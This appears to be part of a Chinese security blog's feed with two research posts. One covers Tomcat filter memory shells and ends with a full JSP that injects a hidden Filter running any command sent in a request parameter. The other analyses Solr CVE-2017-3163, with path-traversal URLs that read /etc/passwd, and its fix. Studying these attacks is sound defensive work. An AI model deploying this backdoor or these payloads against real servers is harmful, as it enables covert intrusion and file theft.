    <content type="html"><![CDATA[<h1 id="内存马初探-Filter"><a href="#内存马初探-Filter" class="headerlink" title="内存马初探-Filter"></a>内存马初探-Filter</h1><h2 id="Tomcat简介"><a href="#Tomcat简介" class="headerlink" title="Tomcat简介"></a>Tomcat简介</h2><p>tomcat其实质上就是一个大点的servlet容器，那什么是容器呢，我觉得其实就是一个类。在tomcat中各个容器之间嵌套。而这些容器都是有生命周期的java类，都继承了共同的接口Lifecycle，所以Lifecycle就是这些容器的顶层接口。下面来谈谈存在哪些容器。</p><h3 id="容器"><a href="#容器" class="headerlink" title="容器"></a>容器</h3><ul><li>init()方法：初始化容器组件，它必须在启动容器之前调用。它会创建许多对象。</li><li>start():启动容器，比如启动一个Server。</li><li>stop()：停止执行</li><li>destroy()：销毁这个容器。</li><li>Server容器：一个StandardServer类实例就表示一个Server容器</li><li>Service容器：一个StandardService类实例就表示一个Service容器</li><li>Engine容器：一个StandardEngine类实例就表示一个Engine容器。</li><li>Host容器：一个StandardHost类实例就表示一个Host容器。</li><li>Context容器：一个StandardContext类实例就表示一个Context容器。</li><li>Wrapper容器：一个StandardWrapper类实例就表示一个Wrapper容器。</li></ul><p>这些容器全都是从上到下嵌套，<strong>需要注意的是这些容器虽然存在父子关系，但是它们的java类并没有父子。</strong></p><p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gpnsa4ppxhj30o60mwmyx.jpg" alt=""></p><pre><code class="java">/**     * Add a child Container, only if the proposed child is an implementation     * of Context.     *     * @param child Child container to be added     */    @Override    public void addChild(Container child) &#123;        child.addLifecycleListener(new MemoryLeakTrackingListener());        if (!(child instanceof Context))//这里说明Host容器的子容器只能是Context容器            throw new IllegalArgumentException                (sm.getString(&quot;standardHost.notContext&quot;));        super.addChild(child);    &#125;</code></pre><p>一个Host容器中可以有多个Wrapper容器。</p><pre><code class="java">    /**     * Add a child Container, only if the proposed child is an implementation     * of Wrapper.     *     * @param child Child container to be added     *     * @exception IllegalArgumentException if the proposed container is     *  not an implementation of Wrapper     */    @Override    public void addChild(Container child) &#123;        // Global JspServlet        Wrapper oldJspServlet = null;        if (!(child instanceof Wrapper)) &#123;//这里说明Context容器的子容器只能是Wrapper容器。            throw new IllegalArgumentException                (sm.getString(&quot;standardContext.notWrapper&quot;));        &#125;　　　　　　//这里删除了部分代码    &#125;</code></pre><h2 id="内存马简单介绍"><a href="#内存马简单介绍" class="headerlink" title="内存马简单介绍"></a>内存马简单介绍</h2><h3 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h3><ul><li>servlet-api<ul><li>filter型</li><li>servlet型</li><li>listener型</li></ul></li><li>指定框架，如spring</li><li>字节码增强型</li><li>任意JSP文件隐藏</li></ul><p>在Tomcat中我们对Servlet进行访问的时候会先通过Filter，如下图所示。<br><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gpnt4cngtwj30hv0abjrc.jpg" alt=""></p><p>因此我们只要中Filter中插入恶意代码，就可以进行命令执行，形成一个内存马。</p><p>Filter：自定义Filter的实现，需要实现javax.servlet.Filter下的init()、doFilter()、destroy()三个方法。</p><ul><li>启动时调用init()方法</li><li>工作时调用doFilter()</li><li>销毁时调用destroy()</li></ul><p>在tomcat中ServletContext的实现是ApplicationContext。在Web应用中，获取的ServletContext实际上是ApplicationContextFacade的对象，对ApplicationContext进行了封装，而ApplicationContext实例中又包含了StandardContext实例，。</p><p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gpnthaev47j30q80wegs4.jpg" alt=""></p><h3 id="Filter注册流程"><a href="#Filter注册流程" class="headerlink" title="Filter注册流程"></a>Filter注册流程</h3><p>我们自己写一个Filter然后下断点，然后跟进createFilterChain。</p><p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gpny2fgoorj31do0e4jui.jpg" alt=""></p><pre><code class="java">filterChain.setServlet(servlet);            filterChain.setSupport(((StandardWrapper)wrapper).getInstanceSupport());            StandardContext context = (StandardContext)wrapper.getParent();            FilterMap[] filterMaps = context.findFilterMaps();            if (filterMaps != null &amp;&amp; filterMaps.length != 0) &#123;                String servletName = wrapper.getName();                int i;                ApplicationFilterConfig filterConfig;                boolean isCometFilter;                for(i = 0; i &lt; filterMaps.length; ++i) &#123;                    if (this.matchDispatcher(filterMaps[i], dispatcher) &amp;&amp; this.matchFiltersURL(filterMaps[i], requestPath)) &#123;                        filterConfig = (ApplicationFilterConfig)context.findFilterConfig(filterMaps[i].getFilterName());                        if (filterConfig != null) &#123;                            isCometFilter = false;                            if (comet) &#123;                                try &#123;                                    isCometFilter = filterConfig.getFilter() instanceof CometFilter;                                &#125; catch (Exception var18) &#123;                                    Throwable t = ExceptionUtils.unwrapInvocationTargetException(var18);                                    ExceptionUtils.handleThrowable(t);                                &#125;                                if (isCometFilter) &#123;                                    filterChain.addFilter(filterConfig);                                &#125;                            &#125; else &#123;                                filterChain.addFilter(filterConfig);                            &#125;                        &#125;                    &#125;                &#125;                for(i = 0; i &lt; filterMaps.length; ++i) &#123;                    if (this.matchDispatcher(filterMaps[i], dispatcher) &amp;&amp; this.matchFiltersServlet(filterMaps[i], servletName)) &#123;                        filterConfig = (ApplicationFilterConfig)context.findFilterConfig(filterMaps[i].getFilterName());                        if (filterConfig != null) &#123;                            isCometFilter = false;                            if (comet) &#123;                                try &#123;                                    isCometFilter = filterConfig.getFilter() instanceof CometFilter;                                &#125; catch (Exception var17) &#123;                                &#125;                                if (isCometFilter) &#123;                                    filterChain.addFilter(filterConfig);                                &#125;                            &#125; else &#123;                                filterChain.addFilter(filterConfig);                            &#125;                        &#125;                    &#125;                &#125;                return filterChain;            &#125; else &#123;                return filterChain;            &#125;        &#125;</code></pre><p>可以看见这里主要是对filterconfig和filterMap进行的操作，而在代码中首先获取了StandardContext其中有三个成员变量和filter相关：</p><p>filter关键的3个属性和2个方法</p><ul><li>FilterConfigs存放了filterDef还保存了当时的Context</li><li>FilterDefs存放了filter的定义，比如名称跟对应的类，类似于<pre><code>  &lt;filter&gt;      &lt;filter-name&gt;filterDemo&lt;/filter-name&gt;      &lt;filter-class&gt;filterDemo&lt;/filter-class&gt;  &lt;/filter&gt;</code></pre></li><li>FilterMaps 存放了所有filter相关的信息包括filterName和urlPattern</li><li>addFilterDef(填充filterDef对象)</li><li>filterStart(初始化 filterConfigs )</li></ul><pre><code class="java">//tomcat 标准 contextpublic class StandardContext extends ContainerBase        implements Context, NotificationEmitter &#123;    //servletContext     protected ApplicationContext context = null;    //获取servletContext    @Override    public ServletContext getServletContext() &#123;        if (context == null) &#123;            context = new ApplicationContext(this);            if (altDDName != null)                context.setAttribute(Globals.ALT_DD_ATTR,altDDName);        &#125;        return context.getFacade();    &#125;    //filterMaps 封装的对象    private final ContextFilterMaps filterMaps = new ContextFilterMaps();        @Override    //servletContext添加filter时调用    public void addFilterMap(FilterMap filterMap) &#123;        validateFilterMap(filterMap);        // Add this filter mapping to our registered set        filterMaps.add(filterMap);        fireContainerEvent(&quot;addFilterMap&quot;, filterMap);    &#125;    //获取filterMaps     //请求到达时获取    @Override    public FilterMap[] findFilterMaps() &#123;        return filterMaps.asArray();    &#125;    //filtername 和 filterconfig 映射    private Map&lt;String, ApplicationFilterConfig&gt; filterConfigs = new HashMap&lt;&gt;();    //通过filtername获取filterconfig bean实例    public FilterConfig findFilterConfig(String name) &#123;        return filterConfigs.get(name);    &#125;    //通过 filterDefs 生成 filterconfigs 映射    public boolean filterStart() &#123;        if (getLogger().isDebugEnabled()) &#123;            getLogger().debug(&quot;Starting filters&quot;);        &#125;        // Instantiate and record a FilterConfig for each defined filter        boolean ok = true;        synchronized (filterConfigs) &#123;            filterConfigs.clear();            for (Entry&lt;String,FilterDef&gt; entry : filterDefs.entrySet()) &#123;                String name = entry.getKey();                if (getLogger().isDebugEnabled()) &#123;                    getLogger().debug(&quot; Starting filter &#39;&quot; + name + &quot;&#39;&quot;);                &#125;                try &#123;                    ApplicationFilterConfig filterConfig =                            new ApplicationFilterConfig(this, entry.getValue());                    filterConfigs.put(name, filterConfig);                &#125; catch (Throwable t) &#123;                    t = ExceptionUtils.unwrapInvocationTargetException(t);                    ExceptionUtils.handleThrowable(t);                    getLogger().error(sm.getString(                            &quot;standardContext.filterStart&quot;, name), t);                    ok = false;                &#125;            &#125;        &#125;        return ok;    &#125;    //filterDefs定义    private Map&lt;String, FilterDef&gt; filterDefs = new HashMap&lt;&gt;();    //添加filterDef    public void addFilterDef(FilterDef filterDef) &#123;        synchronized (filterDefs) &#123;            filterDefs.put(filterDef.getFilterName(), filterDef);        &#125;        fireContainerEvent(&quot;addFilterDef&quot;, filterDef);    &#125;    //查找filterDef    public FilterDef findFilterDef(String filterName) &#123;        synchronized (filterDefs) &#123;            return filterDefs.get(filterName);        &#125;    &#125;&#125;</code></pre><p>ApplicationContext</p><p>实现了 ServletContext 中的 addFilter 方法</p><p>向属性中的StandandContext实例添加filterDef</p><pre><code class="java">public class ApplicationContext implements ServletContext &#123;    //标准上下文属性  包含 filterConfigs filterMaps filterDefs 属性    private final StandardContext context;    //调用StandandContext添加filterDef    private FilterRegistration.Dynamic addFilter(String filterName,            String filterClass, Filter filter) throws IllegalStateException &#123;        if (filterName == null || filterName.equals(&quot;&quot;)) &#123;            throw new IllegalArgumentException(sm.getString(                    &quot;applicationContext.invalidFilterName&quot;, filterName));        &#125;        if (!context.getState().equals(LifecycleState.STARTING_PREP)) &#123;            //TODO Spec breaking enhancement to ignore this restriction            throw new IllegalStateException(                    sm.getString(&quot;applicationContext.addFilter.ise&quot;,                            getContextPath()));        &#125;        FilterDef filterDef = context.findFilterDef(filterName);        // Assume a &#39;complete&#39; FilterRegistration is one that has a class and        // a name        if (filterDef == null) &#123;            filterDef = new FilterDef();            filterDef.setFilterName(filterName);            context.addFilterDef(filterDef);        &#125; else &#123;            if (filterDef.getFilterName() != null &amp;&amp;                    filterDef.getFilterClass() != null) &#123;                return null;            &#125;        &#125;        if (filter == null) &#123;            filterDef.setFilterClass(filterClass);        &#125; else &#123;            filterDef.setFilterClass(filter.getClass().getName());            filterDef.setFilter(filter);        &#125;        return new ApplicationFilterRegistration(filterDef, context);    &#125;&#125;</code></pre><h3 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h3><ol><li>context启动时，调用ServletContainerInitializers添加filter，调用AbstractFilterRegistrationBean类的addRegistration方法向context添加filter</li><li>context中不存在FilterDef则创建对应FilterDef</li><li>AbstractFilterRegistrationBean中configure方法添加匹配filter的uri，默认为/*</li><li>context启动时，调用filterStart方法配置初始化ApplicationFilterConfig</li><li>调用filter的init方法</li><li>对每次到达的请求在StandardWrapperVavel的invoke方法中创建过滤器链</li><li>根据名称获得ApplicationFilterConfig添加到过滤器链，通过ApplicationFilterConfig来获取filter执行</li></ol><h3 id="具体函数"><a href="#具体函数" class="headerlink" title="具体函数"></a>具体函数</h3><ol><li><p>ServletContainerInitializer(TomcatStarter实现类).onStartup() 调用 ServletContextInitializer.onStartup(ServletContext)</p></li><li><p>ServletContextInitializer(AbstractFilterRegistrationBean实现类).onStartup(ServletContext) 调用 ServletContext.addFilter() 方法</p></li><li><p>ServletContext(ApplicationContext实现类).addFilter 方法调用了 StandandContext.addFilterDef()</p></li><li><p>StandandContext.addFilterDef() 方法填充 StandandContext.filterDefs</p></li><li><p>StandandContext.filterStart()方法根据 StandandContext.filterDefs属性 填充 StandandContext.filterConfigs</p></li><li><p>ApplicationFilterFactory根据StandandContext生成filterchain</p></li><li><p>StandardWrapperValve中调用filterchain.doFilter() 方法</p></li><li><p>filterchain结束后调用servlet.service方法</p></li></ol><h3 id="实现步骤"><a href="#实现步骤" class="headerlink" title="实现步骤"></a>实现步骤</h3><ul><li>获取standcontext</li><li>创建恶意Filter</li><li>创建FilterDef并将Filtername和FilterClass放入</li><li>将FilterDef添加到FilterDefs和filterconfig中</li><li>创建一个新的filterMap将URL跟filter进行绑定，并添加到filterMaps中因为filter生效会有一个先后顺序，所以一般来讲我们还需要把我们的filter给移动到FilterChain的第一位去。</li></ul><h3 id="如何获取stancontext"><a href="#如何获取stancontext" class="headerlink" title="如何获取stancontext"></a>如何获取stancontext</h3><p>到这里我们就要思考context是如何获取的呢？下面给出三种方法</p><ul><li>由ServletContext转StandardContext如果可以直接获取到request对象的话可以用这种方法</li><li>从当前线程中获取</li><li>从MBean中获取<br>最后给出代码：</li></ul><pre><code class="java">&lt;%--  Created by IntelliJ IDEA.  User: xiaotan  Date: 2021/4/16  Time: 21:03  To change this template use File | Settings | File Templates.--%&gt;&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;&lt;html&gt;&lt;head&gt;    &lt;title&gt;Title&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;%    String name =&quot;pyshare&quot;;    ServletContext servletContext = request.getServletContext();    ApplicationContextFacade contextFacade = (ApplicationContextFacade) servletContext;    Field applicationContextField = ApplicationContextFacade.class.getDeclaredField(&quot;context&quot;);    applicationContextField.setAccessible(true);    ApplicationContext applicationContext = (ApplicationContext) applicationContextField.get(contextFacade);    Field field = ApplicationContext.class.getDeclaredField(&quot;context&quot;);    field.setAccessible(true);    StandardContext standardContext = (StandardContext) field.get(applicationContext);    Field filterConfigs = standardContext.getClass().getDeclaredField(&quot;filterConfigs&quot;);    filterConfigs.setAccessible(true);    Map configs = (Map) filterConfigs.get(standardContext);    if (configs.get(name) == null)&#123;        Filter filter = new Filter()&#123;            @Override            public void init(FilterConfig filterConfig)  &#123;            &#125;            @Override            public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException &#123;                String cmd;                if ((cmd = servletRequest.getParameter(&quot;pyshare&quot;)) != null) &#123;                    Process process = Runtime.getRuntime().exec(cmd);                    java.io.BufferedReader bufferedReader = new java.io.BufferedReader(                            new java.io.InputStreamReader(process.getInputStream()));                    StringBuilder stringBuilder = new StringBuilder();                    String line;                    while ((line = bufferedReader.readLine()) != null) &#123;                        stringBuilder.append(line + &#39;\n&#39;);                    &#125;                    servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());                    servletResponse.getOutputStream().flush();                    servletResponse.getOutputStream().close();                    return;                &#125;                filterChain.doFilter(servletRequest, servletResponse);            &#125;            @Override            public void destroy() &#123;            &#125;        &#125;;        FilterDef filterDef = new FilterDef();        filterDef.setFilter(filter);        filterDef.setFilterName(name);        filterDef.setFilterClass(filter.getClass().getName());        standardContext.addFilterDef(filterDef);        FilterMap filterMap = new FilterMap();        filterMap.setFilterName(name);        filterMap.setDispatcher(DispatcherType.REQUEST.name());        filterMap.addURLPattern(&quot;/*&quot;);        /**         * 将filtermap 添加到 filterMaps 中的第一个位置         */        standardContext.addFilterMapBefore(filterMap);        Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);        constructor.setAccessible(true);        ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);        configs.put(name,filterConfig);        out.write(&quot;success&quot;);    &#125;%&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gpnzmkkhd9j310v0u0txq.jpg" alt=""></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>但是其实还是没有实现无文件，后面还要结合反序列化漏洞注入内存马</p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://mp.weixin.qq.com/s/YhiOHWnqXVqvLNH7XSxC9w">https://mp.weixin.qq.com/s/YhiOHWnqXVqvLNH7XSxC9w</a><br><a href="https://www.anquanke.com/post/id/219177">https://www.anquanke.com/post/id/219177</a><br><a href="https://mp.weixin.qq.com/s/x4pxmeqC1DvRi9AdxZ-0Lw">https://mp.weixin.qq.com/s/x4pxmeqC1DvRi9AdxZ-0Lw</a></p>]]></content>
    
    <summary type="html">
    
      Java
    
    </summary>
    
    
      <category term="Java" scheme="http://yoursite.com/categories/Java/"/>
    
    
      <category term="Java" scheme="http://yoursite.com/tags/Java/"/>
    
      <category term="悦读" scheme="http://yoursite.com/tags/%E6%82%A6%E8%AF%BB/"/>
    
  </entry>
  
  <entry>
    <title>solr漏洞分析--CVE-2017-3163</title>
    <link href="http://yoursite.com/2021/04/11/solr%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90--CVE-2017-3163/"/>
    <id>http://yoursite.com/2021/04/11/solr%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90--CVE-2017-3163/</id>
    <published>2021-04-11T12:05:01.000Z</published>
    <updated>2021-07-29T05:50:54.596Z</updated>
    
    <content type="html"><![CDATA[<h1 id="solr漏洞分析–CVE-2017-3163"><a href="#solr漏洞分析–CVE-2017-3163" class="headerlink" title="solr漏洞分析–CVE-2017-3163"></a>solr漏洞分析–CVE-2017-3163</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>solr 6.4.0<br>java 1.8</p><p>solr 所有版本下载地址：<a href="http://archive.apache.org/dist/lucene/solr/">http://archive.apache.org/dist/lucene/solr/</a></p><p>启动低版本启动，在example目录下：</p><blockquote><p>java -Xdebug -Xrunjdwp:transport=dt_socket,address=10010,server=y,suspend=y -jar start.jar</p></blockquote><p>高版本启动,bin目录下：</p><blockquote><p>./solr.cmd -f -a “-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=10010” -port 8983 -s “./Solr/solr-6.4.0/example/example-DIH/solr”</p></blockquote><p>IDEA:<br><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gpeu966q2jj31b90u0n3r.jpg" alt=""></p><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><h3 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h3><ul><li>1.4.0-6.4.0</li></ul><p>低版本：</p><blockquote><p><a href="http://127.0.0.1:8983/solr/replication?command=filecontent&amp;file=../../../../../../../../../../../../../etc/passwd&amp;wt=filestream&amp;generation=1">http://127.0.0.1:8983/solr/replication?command=filecontent&amp;file=../../../../../../../../../../../../../etc/passwd&amp;wt=filestream&amp;generation=1</a></p></blockquote><p>较高版本：</p><blockquote><p><a href="http://127.0.0.1:8983/solr/db/replication?command=filecontent&amp;file=../../../../../../../../../../../../../etc/passwd&amp;wt=filestream&amp;generation=1">http://127.0.0.1:8983/solr/db/replication?command=filecontent&amp;file=../../../../../../../../../../../../../etc/passwd&amp;wt=filestream&amp;generation=1</a></p></blockquote><p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gpeudj1f4pj30y40kijwt.jpg" alt=""></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gpeugygyfpj322w0f8q8b.jpg" alt=""></p><p>首先在filter下断点，可以看见这里将request，response，chain传入了重写的filter。</p><p>org.apache.solr.servlet.SolrDispatchFilter#getHttpSolrCall<br><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gpeuqzidu6j31800mmgq1.jpg" alt=""></p><p>其中对一些变量进行了赋值，主要是解析req从中获取core名称，并向req中写入一些属性，初始化一些core相关的参数，检查core在不在corecontainer中，并做一些错误异常抛出的处理，以及得到当前url的action类型。<br><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gpeusvume8j31q20ciwmw.jpg" alt=""></p><p>后面跟入httpsolrall类的call方法<br><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gpeuur8rjaj31300teafz.jpg" alt=""><br>继续跟进到init函数中，init中进行初始化的一些解析操作，比如handler、path、action等成员的解析赋值，比如这里的action为PROCESS<br><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gpeuwresf4j313u0pgwno.jpg" alt=""></p><p>下面根据action的值进入不同的分支中：<br><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gpeuy77tisj31d60r04e0.jpg" alt=""><br>进入execute函数中，并继续跟入execute中，<br><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gpev2j6ni2j314m08uq7s.jpg" alt=""><br><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gpev4d0w4dj31ce0eyadb.jpg" alt=""><br>跟入hanlderRequest中，<br><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gpev4d0w4dj31ce0eyadb.jpg" alt=""><br><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gpev6v82lnj31ka0cu10d.jpg" alt=""><br>在handleRequestBody中，对commadn进行赋值<br><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gpev6v82lnj31ka0cu10d.jpg" alt=""></p><p>solr/core/src/java/org/apache/solr/handler/ReplicationHandler.java<br><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gpevbfszbuj316g0gkn1c.jpg" alt=""></p><p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gpevcptqu4j31l80n40y9.jpg" alt=""><br>基本上都是从SolrParams对象中取值并赋值到DirectoryFileStream对象成员<br>solr/core/src/java/org/apache/solr/handler/ReplicationHandler.java</p><p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gpevi8w7wwj31760u0tpw.jpg" alt=""><br>将恶意文件读取的参数传入dir.openInput，查看IndexInput类对象in<br><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gpevlh2va4j31m209mdmi.jpg" alt=""></p><h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gpewm40h1qj31na0jcgq5.jpg" alt=""><br>在6.4.2中添加了如下代码，判断是否存在..，如果存在则会返回403<br><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gpewnkpmcfj30po0eygn9.jpg" alt=""></p>]]></content>
    
    <summary type="html">
    
      Java
    
    </summary>
    
    
      <category term="Java" scheme="http://yoursite.com/categories/Java/"/>
    
    
      <category term="Java" scheme="http://yoursite.com/tags/Java/"/>
    
      <category term="悦读" scheme="http://yoursite.com/tags/%E6%82%A6%E8%AF%BB/"/>
    
  </entry>
  
</feed>
